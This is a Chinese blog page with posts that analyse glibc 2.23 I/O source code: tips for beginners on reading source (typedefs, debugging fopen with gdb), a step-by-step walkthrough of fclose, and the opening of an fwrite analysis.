<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word   st_name;      <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr   st_value;     <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word   st_size;      <span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>    st_info;      <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>    st_other;     <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section    st_shndx;     <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>

<p>这似乎是在定义变量？ 可是没听过Elf32_Word是个变量类型啊。</p>
<p>鼠标右键一下（我当时用的是VisualStudio ，发现是有个转到定义的，就说明这个Elf32_Word也是个被定义的东西</p>
<img src="https://s2.loli.net/2022/08/13/TXZfAaqK5Cg3D2l.png" alt="image-20220301130300184" style="zoom:33%;" />

<p>到定义那里看一下发现了typedef这个东西和uint32_t，奈何c的基础不牢，google一下。</p>
<p><img src="https://s2.loli.net/2022/08/13/QmLDs2RXeESOtof.png" alt="image-20220301130416557"></p>
<p>发现了这个东西其实就是类似于提供了一个自定义类型的功能，举个例子，typedef unsigned int ai;</p>
<p>那么此时的ai就相当于unsigned int这个东西了，因此比如我们想定义一个unsigned int类型的变量b，就可以写成这样了，ai b;此时的效果是和unsigned int b;效果是一样的</p>
<p>那么这个uint32_t又是什么呢？继续google。</p>
<p>发现了这个uint32_t的这个_t的意思是这些数据类型（指的是uint32_t,而并非Elf32_Word）是通过typedef来定义的，而不是新的数据类型。也就是说，他们其实是我们已知的类型的别名。</p>
<p>然后下面这些就是这些数据类型被定义的地方</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">ifndef</span> __int8_t_defined  </span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __int8_t_defined  </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">signed</span> <span class="type">char</span> <span class="type">int8_t</span>;</span><br><span class="line"><span class="keyword">typedef</span>	<span class="type">short</span> <span class="type">int</span> <span class="type">int16_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> <span class="type">int32_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> __WORDSIZE == 64  </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">int</span> <span class="type">int64_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span>  </span></span><br><span class="line">__extension__</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> <span class="type">int64_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span>  </span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span>  </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">char</span> <span class="type">uint8_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> <span class="type">uint16_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">ifndef</span> __uint32_t_defined  </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="type">uint32_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __uint32_t_defined  </span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span>  </span></span><br><span class="line"><span class="meta"># <span class="keyword">if</span> __WORDSIZE == 64  </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> <span class="type">uint64_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span>  </span></span><br><span class="line">__extension__</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> <span class="type">uint64_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span>  </span></span><br></pre></td></tr></table></figure>

<p>如此再回到这行代码  Elf32_Word	st_name，其实它就等同于unsigned int st_name，此时应该就能够看懂了。</p>
<p>最后回到最开始的那个问题，为什么这个结构是16字节？</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word   st_name;      <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr   st_value;     <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word   st_size;      <span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>    st_info;      <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>    st_other;     <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section    st_shndx;     <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>

<p>因为分别查看了定义类型发现Elf32_Word和Elf32_Addr都是unsigned int类型，这个类型是4个字节，而unsigned char是1个字节，而查看了Elf32_Section发现它是被uint16_t定义的，而uint16_t则是unsigned short int类型，为2个字节。因此整个结构体为16字节。</p>
<p><strong>上面两个示例都提供了解决问题的基本思考方式，希望对师傅们有帮助</strong></p>
<h2 id="4、分析一个函数源码首先应该做的是什么？"><a href="#4、分析一个函数源码首先应该做的是什么？" class="headerlink" title="4、分析一个函数源码首先应该做的是什么？"></a>4、分析一个函数源码首先应该做的是什么？</h2><p>我这里提供一个初学者最开始分析源码的一个思路。</p>
<p>以我最初分析fopen函数源码为例，首先肯定是要把vscode打开，确保自己手里有一份源码(而非只看某篇文章出现的源码)，然后先用gdb去调试，这次调试看什么？对于初学者而言，第一次应该是啥都看不懂，那也要硬着头皮把整个函数的汇编指令都si给执行一遍(就最起码对整个函数调用的函数数量，哪些出现频率高的函数起码有个印象)，然后第二次在把整个函数的汇编指令都si给执行一遍，这次去观察并记录期间调用的函数关系(最好是拿图画下来)，看不懂函数关系也没事，但至少要去画一遍或者写一遍。(就如下图这样)</p>
<p><img src="https://s2.loli.net/2022/08/13/LTdExvIBYAWhaeZ.png" alt="image-20220813082114252"></p>
<p>现在我们已经通过自己的调试有了一份“地图”，然后开始对着vscode源码开始从头分析。因为刚开始肯定有很多地方都不懂，那我们所谓的分析就会变的异常困难，<strong>我们可以先试着预测函数的走向以及执行后可能的结果。</strong></p>
<p>举个最简单的例子:</p>
<p>下面的代码就是fopen函数的最开始部分，发现在69行执行了malloc函数，那我们就可以<del>猜测</del>推断__fopen_internal函数就会调用malloc函数，而malloc申请的内存大小应该是locked_FILE结构体的大小，而返回的地址则给了new_f。(如下图)</p>
<img src="https://s2.loli.net/2022/08/13/89enG1XHJkFdirb.png" alt="image-20220813082708464" style="zoom:50%;" />

<p>因为是初学时的源码分析，我们并不能保证百分百是这样的，那我们就用动态调试来看看是不是这样的，发现动态调试到这里，确实执行到了这里。</p>
<p><img src="https://s2.loli.net/2022/08/13/HSQ13JrKZWyxwER.png" alt="image-20220813083404379"></p>
<p>我们执行这行代码后再看下locked_FILE结构体的大小(如下)，因此判断申请的堆块大小最终为0x231(0x220+0x10+0x1)</p>
<p><img src="https://s2.loli.net/2022/08/13/wyGRTcgW2NbDqmu.png" alt="image-20220813083513162"></p>
<p><img src="https://s2.loli.net/2022/08/13/AJKH4MogpXh3GtS.png" alt="image-20220813083643376"></p>
<p>而new_f的值应该是malloc返回的堆块的用户区地址。(如下)</p>
<p><img src="https://s2.loli.net/2022/08/13/iMSIPThdeqc16U2.png" alt="image-20220813083753980"></p>
<p>至此我们就完成了一次最简单的验证。</p>
<p>而之后的流程也大致如此，先看源码分析，如果源码看懂了那就配合动态调试看看是否是自己分析的那样，如果源码没看懂，就直接动态调试看看函数是怎么执行的。对于初学者而言刚开始可能会比较困难，可以去网上找一些师傅已经做过的源码分析来作为参考，这样遇到实在分析不懂的地方，就看看其他师傅是怎么分析的。</p>
<h2 id="5、善于用搜索引擎"><a href="#5、善于用搜索引擎" class="headerlink" title="5、善于用搜索引擎"></a>5、善于用搜索引擎</h2><p>现在许多常见的问题其实很多都可以在师傅们的文章中找到答案，如果遇到自己不会的问题，可以尝试在百度或者google上搜索(如果有条件的话，最好还是用google)。</p>
<h2 id="6、总结函数的调用流程"><a href="#6、总结函数的调用流程" class="headerlink" title="6、总结函数的调用流程"></a>6、总结函数的调用流程</h2><p>为了确保自己是真的熟悉了函数整个的调用流程，建议调试过之后，自己在不看源码的情况下，将函数的调用流程总结一遍。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/b5738aac.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/b5738aac.html" class="post-title-link" itemprop="url">IO学习--源码分析fclose函数</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:50:20" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95-%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">源码调试&&分析</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>之前分析的三个函数文章链接:</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16567446.html">IO学习–源码调试fopen函数</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16575066.html">IO学习–源码分析fread函数</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16578093.html">IO学习–源码分析fwrite函数</a></p>
<p>这篇是IO函数源码分析四部曲中的最后一个fclose函数(并不是以后不分析了，说实话我感觉分析源码去看看我们平常使用的函数到底是怎么实现的，这个过程很有意思，因此以后有机会的话会再调试一些其他函数，花了四天分析了这四个函数，从最开始分析fopen函数源码的时候懵懵逼逼(那篇文章我基本是纯配合着动态调试才搞懂的整体逻辑)，到分析fread函数时对reserve area以及输入和输出缓冲区有了认识，再到基本是对着源码分析的fwrite函数(也是配合着动态调试，不过此时就是静态分析源码为主了)，最后到分析fclose函数源码时感觉的异常顺利和自然。真的是分析每个函数时都有不同的感受。</p>
<p>emmm，感慨有些多了，下面进入正文。</p>
<h2 id="整体流程："><a href="#整体流程：" class="headerlink" title="整体流程："></a>整体流程：</h2><p>下面是fclose函数的整体流程，其他师傅如果分析的时候，可以参考下图。</p>
<img src="https://s2.loli.net/2022/08/12/QDBqLfxORoUMbH8.png" alt="image-20220812201040809" style="zoom:50%;" />

<h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码:"></a>源代码:</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> value[<span class="number">20</span>];</span><br><span class="line">    <span class="type">char</span> new[<span class="number">30</span>]=<span class="string">&quot;nice-day&quot;</span>;</span><br><span class="line">    FILE* fp=fopen(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;wt+&quot;</span>);</span><br><span class="line">    fwrite(new,<span class="number">1</span>,<span class="number">10</span>,fp);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>本文的源代码以及调试的程序所依赖的libc都为2.23版本的</strong></p>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析:"></a>源码分析:</h2><p>先看第一部分，经过一些寻常检查后，去调用了_IO_un_link 函数。在fopen函数中新创建了_IO_FILE结构体，将其链入了_IO_list_all链表，而这个_IO_un_link 函数则是将fopen函数中创建的_IO_FILE结构体脱链（代码如下）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_fclose (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line"></span><br><span class="line">  CHECK_FILE(fp, EOF);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">  <span class="comment">/* We desperately try to help programs which are using streams in a</span></span><br><span class="line"><span class="comment">     strange way and mix old and new functions.  Detect old streams</span></span><br><span class="line"><span class="comment">     here.  */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_old_fclose (fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line">	······</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="脱链部分"><a href="#脱链部分" class="headerlink" title="脱链部分"></a>脱链部分</h3><p>下面是_IO_un_link函数的源码，整体也很好分析。就是先去判断我们要脱链的这个_IO_FILE结构体是否为链表的头指针。如果是的话执行<code>_IO_list_all = (struct _IO_FILE_plus *) _IO_list_all-&gt;file._chain</code>来脱链（代码如下）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_un_link (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;file._flags &amp; _IO_LINKED)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> **<span class="title">f</span>;</span></span><br><span class="line">	......</span><br><span class="line">      <span class="keyword">if</span> (_IO_list_all == <span class="literal">NULL</span>)</span><br><span class="line">	;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (fp == _IO_list_all)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_list_all = (<span class="keyword">struct</span> _IO_FILE_plus *) _IO_list_all-&gt;file._chain;</span><br><span class="line">	  ++_IO_list_all_stamp;</span><br><span class="line">	&#125;</span><br><span class="line">	......</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>如果要脱链的结构体不是链表头指针的话，就去遍历整个链表，去找到需要脱链的那个结构体，然后再脱链(代码如下)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">else</span></span><br><span class="line"><span class="keyword">for</span> (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain)</span><br><span class="line">  <span class="keyword">if</span> (*f == (_IO_FILE *) fp)</span><br><span class="line">    &#123;</span><br><span class="line">      *f = fp-&gt;file._chain;</span><br><span class="line">      ++_IO_list_all_stamp;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>



<h3 id="刷新输出缓冲区"><a href="#刷新输出缓冲区" class="headerlink" title="刷新输出缓冲区"></a>刷新输出缓冲区</h3><p>脱链之后，调用了_IO_file_close_it函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_acquire_lock (fp);</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">  status = _IO_file_close_it (fp);</span><br></pre></td></tr></table></figure>



<p>_IO_new_file_close_it函数中显示判断了一下文件是否有写的权限，如果有的话就调用_IO_do_flush函数来刷新输出缓冲区。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_close_it (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> write_status;</span><br><span class="line">  <span class="keyword">if</span> (!_IO_file_is_open (fp))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_NO_WRITES) == <span class="number">0</span></span><br><span class="line">      &amp;&amp; (fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != <span class="number">0</span>)</span><br><span class="line">    write_status = _IO_do_flush (fp);</span><br><span class="line">	·······</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>_IO_do_flush是宏定义，调用了_IO_do_write函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_do_flush(_f) \</span></span><br><span class="line"><span class="meta">  _IO_do_write(_f, (_f)-&gt;_IO_write_base,				      \</span></span><br><span class="line"><span class="meta">	       (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)</span></span><br></pre></td></tr></table></figure>

<p>_IO_do_write函数对输出缓冲区的剩余部分（也就是宏定义中的(_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base）进行了判断，如果输出缓冲区为0的话就直接返回，如果输出缓冲区中有数据的话就调用new_do_write函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_do_write _IO_do_write</span></span><br><span class="line">_IO_new_do_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">	  || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>new_do_write函数主要做了两件事，第一执行了系统调用write将输出缓冲区中的数据都读到了文件中。第二就是重置了_IO_write_ptr指针(这两个操作就意味着刷新了输出缓冲区)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">new_do_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">	......</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">		       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">		       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="系统调用close"><a href="#系统调用close" class="headerlink" title="系统调用close"></a>系统调用close</h3><p>而后随着new_do_write函数的返回，程序再次返回到_IO_new_file_close_it中，此时调用了vtable中的_IO_file_close函数(这个函数就不再说了，就是系统调用了一下close)，然后至此的话主要就剩申请的reserve area区域以及申请出来存放_IO_FILE结构体的内存还没有释放。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> close_status = ((fp-&gt;_flags2 &amp; _IO_FLAGS2_NOCLOSE) == <span class="number">0</span></span><br><span class="line">      ? _IO_SYSCLOSE (fp) : <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<h3 id="将reserve-area释放掉"><a href="#将reserve-area释放掉" class="headerlink" title="将reserve area释放掉"></a>将reserve area释放掉</h3><p>最后_IO_new_file_close_it函数还剩下面这部分代码，先删除reserve area然后将read和write相关指针全部置空，最后调用_IO_un_link确保fopen函数申请的_IO_FILE结构体已经从_IO_list_all链表中脱链。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_setb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);<span class="comment">//删除reserve area</span></span><br><span class="line">_IO_setg (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);<span class="comment">//这个宏是将read相关指针全部置空</span></span><br><span class="line">_IO_setp (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>);<span class="comment">//这个宏是将write相关指针全部置空</span></span><br><span class="line"></span><br><span class="line">_IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line">fp-&gt;_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;</span><br><span class="line">fp-&gt;_fileno = <span class="number">-1</span>;</span><br><span class="line">fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> close_status ? close_status : write_status;</span><br></pre></td></tr></table></figure>



<p>这个_IO_setb函数代码如下，发现是先将reserve area这片内存给释放掉，然后清空_IO_buf_base和_IO_buf_end两个指针，这也就意味着将reserve area删除掉了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_setb (_IO_FILE *f, <span class="type">char</span> *b, <span class="type">char</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="将结构体fp的内存释放掉"><a href="#将结构体fp的内存释放掉" class="headerlink" title="将结构体fp的内存释放掉"></a>将结构体fp的内存释放掉</h3><p>最后返回到_IO_new_fclose函数，先是调用了vtable中的_IO_default_finish函数(这个函数中做的操作，之前已经做过了，其实就相当于啥都没干)，然后最后将结构体fp释放掉。至此fclose函数结束。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> _IO_release_lock (fp);</span><br><span class="line"> _IO_FINISH (fp);</span><br><span class="line">······</span><br><span class="line"> <span class="keyword">if</span> (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)</span><br><span class="line">   &#123;</span><br><span class="line">     fp-&gt;_IO_file_flags = <span class="number">0</span>;</span><br><span class="line">     <span class="built_in">free</span>(fp);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> status;</span><br></pre></td></tr></table></figure>



<h2 id="总结fclose函数调用流程："><a href="#总结fclose函数调用流程：" class="headerlink" title="总结fclose函数调用流程："></a>总结fclose函数调用流程：</h2><p>先将_IO_FILE结构体脱链，然后去看输出缓冲区中是否还有内容，如果有的话就系统调用write将输出缓冲区中的内容写入文件然后刷新输出缓冲区。接着系统调用close关闭文件，最后将申请的reserve area和装有_IO_FILE结构体的堆块给释放掉。</p>
<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a target="_blank" rel="noopener" href="https://fish-o0o.github.io/2019/12/29/FILE%E7%BB%93%E6%9E%84%E4%BD%93%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/#fclose">FILE结构体及漏洞利用方法 | Hacked By Fish_o0O (fish-o0o.github.io)</a></p>
<p><a target="_blank" rel="noopener" href="https://ray-cp.github.io/archivers/IO_FILE_fclose_analysis">IO FILE之fclose详解 « 平凡路上 (ray-cp.github.io)</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/7b71046d.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/7b71046d.html" class="post-title-link" itemprop="url">IO学习--源码调试fwrite函数</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:50:10" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95-%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">源码调试&&分析</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h2><p>这个fwrite函数中的_IO_write_ptr指针的挪动和fread函数中的_IO_read_ptr指针的挪动是不太一样的。先回顾一下上一篇文章中_IO_read_ptr指针什么时候挪动？当系统调用read的时候从文件中读取多少个字节的数据到输入缓冲区，就将_IO_read_end指针挪动多少个字节**(初始值和_IO_read_base是一样的)<strong>，而此时的_IO_read_ptr指针不动。当执行memcpy函数将数据从输入缓冲区拷贝多少个字节的数据到我们指定的内存地址，就将_IO_read_ptr指针挪动多少个字节。</strong>在_IO_read_base和_IO_read_ptr之间是已经拷贝过的数据，_IO_read_ptr和_IO_read_end之间是输入缓冲区中还未拷贝的数据。**</p>
<p>而本次分析的<strong>fwrite函数则是直接将_IO_buf_end的值赋给了_IO_write_end</strong>（read的那个指针可不是这样），而_IO_write_ptr的初始值则和_IO_write_base的值一样。该函数先从指定的内存地址读取一定字节的数据到输出缓冲区，此时的_IO_write_ptr指针挪动(我这里以及上下文提到的挪动指的都是在原本的基础上加)相应的字节。此时的<strong>_IO_write_base指针和_IO_write_ptr指针之间的区域是将要从输出缓冲区写入文件的数据，而_IO_write_ptr指针和_IO_write_end指针之间的区域是输出缓冲区的可用区域(就是还能再往输出缓冲区拷贝多少个字节的内容)<strong>，当执行系统调用write往文件中写入一定的字节的内容后，_IO_write_ptr就会</strong>减去相应的字节</strong>。</p>
<p>上面的内容一定要清楚，不然分析的时候就会陷入误区</p>
<p>前面两篇文章的地址如下：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16567446.html">IO学习–源码调试fopen函数</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16575066.html">IO学习–源码分析fread函数 </a></p>
<h2 id="整体流程："><a href="#整体流程：" class="headerlink" title="整体流程："></a>整体流程：</h2><p><img src="/../img/image-20221007220914882.png" alt="image-20221007220914882"></p>
